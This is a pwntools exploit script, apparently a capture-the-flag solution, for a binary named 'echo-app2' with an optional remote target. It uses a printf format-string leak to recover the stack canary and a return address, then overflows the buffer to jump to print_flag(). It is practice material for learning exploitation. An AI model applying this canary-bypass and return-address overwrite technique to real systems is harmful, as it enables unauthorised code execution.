#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("echo-app2")

gs = '''
b *do_echo+397

'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("54.85.45.101", 8009)
    else:
        return process(elf.path)

# Plan:
# All security mechanisms are enabled. We have to use the printf(buffer) format string vulnerability
# to leak important information on the stack

# Fuzz
# Leak canary
# Leak print_flag()
# Find offsets to canary and ret addr
# Overwrite canary with leaked value and ret addr with leaked print_flag()

# Addresses
# Canary at: %39$llx
# print_flag() at: %41$llx
# Offset canary: 256
# Offset ret addr: 272

# Functions

io = start()

# Canary 
io.sendline(b"%39$llx")
canary_leak = int(io.recv(), 16)
log.info("Canary: %s" % hex(canary_leak))

# ret
io.sendline(b"%41$llx")
ret_leak = int(io.recv(), 16)
log.info("Current ret: %s" % hex(ret_leak))

# print_flag()
# offset 0x229
print_flag = 0x229

# Bitwise and
ret_leak &= 0xfffffffffffff000

# Bitwise or
ret_leak |= 0x229

log.info("print_flag(): %s" % hex(ret_leak))

offset = b"A"*264

p = offset
#p += b"B"*8
#p += b"C"*8
#p += b"D"*8
p += p64(canary_leak)
p += b"B"*8 # rbp
p += p64(ret_leak)

io.sendline(p)

io.interactive()
